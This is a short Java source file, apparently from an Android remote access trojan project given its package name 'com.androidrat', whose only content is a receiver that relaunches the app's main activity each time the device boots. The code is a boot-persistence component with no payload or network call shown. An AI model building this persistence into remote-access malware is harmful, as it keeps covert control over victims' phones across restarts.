package com.androidrat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            if (action.equals(Intent.ACTION_BOOT_COMPLETED) || 
                action.equals("android.intent.action.QUICKBOOT_POWERON")) {
                
                Intent bootIntent = new Intent(context, MainActivity.class);
                bootIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(bootIntent);
            }
        }
    }
}
